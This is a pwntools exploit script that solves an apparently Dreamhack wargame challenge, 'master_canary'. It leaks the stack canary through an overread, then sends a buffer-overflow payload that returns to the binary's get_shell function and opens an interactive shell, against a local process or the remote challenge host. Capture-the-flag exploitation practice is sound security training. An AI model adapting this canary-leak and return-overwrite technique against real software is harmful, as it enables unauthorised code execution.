#!/usr/bin/env python3
from pwn import *

PORT = 19148
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./master_canary_patched', checksec=False)
# libc = ELF('./libc-2.23.so', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x0000000000400bf5
            b* 0x400c5a
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt):
	sla(b'> ', str(opt).encode())

def input_(sz, dt):
	menu(2)
	sla(b'Size: ', str(sz).encode())
	sa(b'Data: ', dt)

# GDB()
menu(1)
input_(0x8e8+1, b'A'*(0x8e8+1))
p.recvuntil(b'A'*(0x8e8+1))
canary = u64(b'\x00' + p.recv(7))
log.info(f'canary : {hex(canary)}')

pl = flat(
	b'A'*0x28,
	canary,
	b'B'*0x8,
	0x00000000004007e1,
	elf.sym.get_shell
	)

menu(3)
sla(b'comment: ', pl)

p.interactive()